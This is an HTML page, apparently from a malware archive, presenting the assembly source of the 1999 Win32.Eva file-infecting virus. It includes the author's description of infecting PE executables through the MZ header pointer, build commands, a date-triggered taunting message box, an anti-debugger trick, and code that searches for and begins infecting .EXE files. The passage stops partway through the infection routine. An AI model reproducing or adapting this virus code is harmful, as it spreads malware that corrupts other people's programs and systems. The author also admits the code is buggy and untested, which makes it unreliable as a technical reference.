<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Eva.a - eva.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Win32.Eva virus.</span><span class="sc0">
</span><span class="sc1">;(c) 1999 by Benny</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's description</span><span class="sc0">
</span><span class="sc1">;---------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Let me introduce my first COMPLETE Win32 infector. Yeah, i have written several parts</span><span class="sc0">
</span><span class="sc1">;of viruses, but this babe is my tiniest one with all needed functions to spread out.</span><span class="sc0">
</span><span class="sc1">;Win32.Eva is simple appender, infects one EXE file by changing pointer at 3ch</span><span class="sc0">
</span><span class="sc1">;in the MZ header, which points to new exe. After infection, MZ_lfanew pointer will be</span><span class="sc0">
</span><span class="sc1">;pointing to the viruses new PE header. So, if u will execute infected program under Win9X,</span><span class="sc0">
</span><span class="sc1">;WinNT or under Win3.1x with Win32s subsystem, program will start at the new location.</span><span class="sc0">
</span><span class="sc1">;After virus will be done with his work executes program again with changed</span><span class="sc0">
</span><span class="sc1">;MZ_lfanew pointer, that will be pointing to the original PE header.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Payload</span><span class="sc0">
</span><span class="sc1">;--------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On February the 2nd will display message box with some stupid comments.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;To build</span><span class="sc0">
</span><span class="sc1">;---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;tasm32 -ml -m5 -q eva.asm</span><span class="sc0">
</span><span class="sc1">;tlink32 -Tpe -c -x -aa -r eva,,, import32</span><span class="sc0">
</span><span class="sc1">;pewrsec eva.exe    (thanx Jacky !)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AVP's description</span><span class="sc0">
</span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is a direct action (nonmemory resident) parasitic Win32 infector. It</span><span class="sc0">
</span><span class="sc1">;searches for PE EXE files in the Windows, Windows system [* Benny's note: it</span><span class="sc0">
</span><span class="sc1">;DOESN'T infect files in Windows/System directory!] and current directories,</span><span class="sc0">
</span><span class="sc1">;then writes itself to the end of the file. While infecting the virus does not</span><span class="sc0">
</span><span class="sc1">;modify the PE header at all, the infection way is based only on DOS Stub</span><span class="sc0">
</span><span class="sc1">;header: the virus writes to there new file offset of PE header (virus PE</span><span class="sc0">
</span><span class="sc1">;header). As a result the infected file has three parts: first part is original</span><span class="sc0">
</span><span class="sc1">;DOS stub, the second part is host PE data (not modified), third part is virus</span><span class="sc0">
</span><span class="sc1">;code and data.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus has PE file structure: it contains PE header, section headers, import</span><span class="sc0">
</span><span class="sc1">;table, code and data sections. The modified DOS stub in infected files points</span><span class="sc0">
</span><span class="sc1">;to virus PE header instead of original ones. As a result, Windows32 while</span><span class="sc0">
</span><span class="sc1">;executing infected files reads and runs virus code instead of host one.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;To return to the host program the virus creates a copy of the infected file,</span><span class="sc0">
</span><span class="sc1">;disinfects it (just restores file offset of PE header) and spawns.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On February 2nd the virus displays the message window: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Eva by Benny, (c) 1999</span><span class="sc0">
</span><span class="sc1">;  Hello stupid user, i'm so sorry, but i have to interrupt your work,</span><span class="sc0">
</span><span class="sc1">;  'cause I hate this shitty program. Click OK to continue.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Greets to:</span><span class="sc0">
</span><span class="sc1">;          Super/29A</span><span class="sc0">
</span><span class="sc1">;          Darkman/29A</span><span class="sc0">
</span><span class="sc1">;          Jacky Qwerty/29A</span><span class="sc0">
</span><span class="sc1">;          Billy Belcebu/DDT</span><span class="sc0">
</span><span class="sc1">;          and many other 29Aers...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Some greets</span><span class="sc0">
</span><span class="sc1">;------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;All 29Aers.... And thats only the beginnin' :-)</span><span class="sc0">
</span><span class="sc1">;Super/29A..... However, blue screen is still the best Sexy's effect :-)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Who is Eva ?</span><span class="sc0">
</span><span class="sc1">;-------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Eva is one pretty girl with nice black/red hair and lovely eyes.</span><span class="sc0">
</span><span class="sc1">;I hope, that this work (fully programmed and commented by three days - good</span><span class="sc0">
</span><span class="sc1">;motivation :-)) will say some words to Eva better than I X-DD. I hate myself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Last notes</span><span class="sc0">
</span><span class="sc1">;-----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus has many bugs (after many repairs without tests) and in this time, I don't care</span><span class="sc0">
</span><span class="sc1">;about it. Don't bitch if, that it doesn't work and look at my last viruses... Hey, it's my first</span><span class="sc0">
</span><span class="sc1">;virus, so gimme space for living X-D.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;And here is it...</span><span class="sc0">



</span><span class="sc2">.386p</span><span class="sc0">                           </span><span class="sc1">;386 instructions</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                     </span><span class="sc1">;32bit offset, no segments</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PE.inc</span><span class="sc0">                      </span><span class="sc1">;include some needed files</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">               </span><span class="sc1">;and import needed APIs</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                           </span><span class="sc1">;data section</span><span class="sc0">

    </span><span class="sc5">msgTitle</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Win32.Eva by Benny, (c) 1999'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">msgText</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Hello stupid user, i''m so sorry, but i have to interrupt your work,'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'''cause I hate this shitty program. Click OK to continue.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Greets to:'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Super/29A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Darkman/29A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Jacky Qwerty/29A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Billy Belcebu/DDT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'and many other 29Aers...'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">kernel</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IsDebuggerPresent</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IsDebuggerPresent'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fmask</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;search mask</span><span class="sc0">
    </span><span class="sc5">DestFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'aaaaeva.exe'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;temporary file</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">space</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;space between name and params</span><span class="sc0">
    </span><span class="sc5">CmdLine</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;command line</span><span class="sc0">
    </span><span class="sc5">win32_find_data</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">search_handle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hMyFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hMapFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hMyMapFile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpMyFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">lppiProcInfo</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;needed by CreateProcessA</span><span class="sc0">
    </span><span class="sc5">hProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hThread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwProcessID</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">dwThreadID</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">lpsiStartInfo</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">lpWindowsPath</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">lpCurrentPath</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">lpCurrentPath</span><span class="sc0">
    </span><span class="sc5">lpSystemTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;these variables may overlap</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                               </span><span class="sc1">;code of virus starts here</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_fn</span><span class="sc4">&gt;</span><span class="sc0">                </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;bye TD32 !</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2dh</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">

</span><span class="sc5">seh_rs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpFileName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">                 </span><span class="sc1">;get file-name of me</span><span class="sc0">

</span><span class="sc5">test_dir</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;i wont infect files in Windows</span><span class="sc0">
                                </span><span class="sc1">;dir, 'cause NT could crash</span><span class="sc0">
                                </span><span class="sc1">;on start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpCurrentPath</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">               </span><span class="sc1">;get current directory</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpWindowsPath</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">               </span><span class="sc1">;getwindows directory</span><span class="sc0">

</span><span class="sc5">N_Char</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;compare</span><span class="sc0">
</span><span class="sc5">jpatch</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoMatch</span><span class="sc0">                     </span><span class="sc1">;no match, jump</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc0">                        </span><span class="sc1">;second jump for next test</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;end of string ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">N_Char</span><span class="sc0">                      </span><span class="sc1">;no, get next char</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_to_host</span><span class="sc0">                    </span><span class="sc1">;yeah, we're in Windows dir.,</span><span class="sc0">
                                </span><span class="sc1">;jump to host</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">NoMatch</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpWindowsPath</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">                </span><span class="sc1">;get windows system dir.</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jpatch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">                </span><span class="sc1">;path first jump with NOPs,</span><span class="sc0">
                                </span><span class="sc1">;second will take effect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">N_Char</span><span class="sc0">                      </span><span class="sc1">;and test directory</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">
    
</span><span class="sc5">FindFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win32_find_data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fmask</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">                 </span><span class="sc1">;find first file</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_search</span><span class="sc0">                                          </span><span class="sc1">;no files, quit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;save search handle</span><span class="sc0">

</span><span class="sc5">try_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">win32_find_data.WFD_nFileSizeHigh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;discard huge files</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Try_Next</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">win32_find_data.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;discard small files</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Try_Next</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">64</span><span class="sc4">*</span><span class="sc2">64</span><span class="sc4">*</span><span class="sc2">512</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;discard huge files</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">

</span><span class="sc5">Try_Next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win32_find_data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">search_handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">                  </span><span class="sc1">;try next file</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">exit_search</span><span class="sc0">                   </span><span class="sc1">;no files, quit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">try_infect</span><span class="sc0">                      </span><span class="sc1">;try infect it</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">67h</span><span class="sc0">                          </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win32_find_data.WFD_szFileName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">                 </span><span class="sc1">;black file attributes</span><span class="sc0">
